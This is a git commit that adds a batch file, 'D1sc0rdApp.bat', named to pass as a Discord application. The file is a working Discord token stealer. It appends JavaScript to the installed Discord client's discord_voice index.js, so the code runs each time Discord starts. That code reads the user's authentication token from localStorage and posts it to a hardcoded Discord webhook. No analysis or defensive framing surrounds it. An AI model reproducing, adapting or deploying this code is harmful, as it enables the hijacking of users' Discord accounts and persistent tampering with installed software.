387d45107fbebb1338b666318b1c74cf5752e54d
AndOrNo1ne <79289890+AndOrNo1ne@users.noreply.github.com>
2021-02-18 19:18:23 -0500

    Create D1sc0rdApp.bat

---
+++ D1sc0rdApp.bat
@@ -0,0 +1,4 @@
+
+set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/809917231365619712/1HjDzmoXBUuUdL8gvlJHjxkVqFgeSZtz9TSu34d3Qqfzw90AFzLpb31YqgEGFH8sYgHI', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
+md "%appdata%\Discord\0.0.309\modules\discord_voice\D1sc0rdApp"
+echo %str% >> "%appdata%\Discord\0.0.309\modules\discord_voice\index.js"
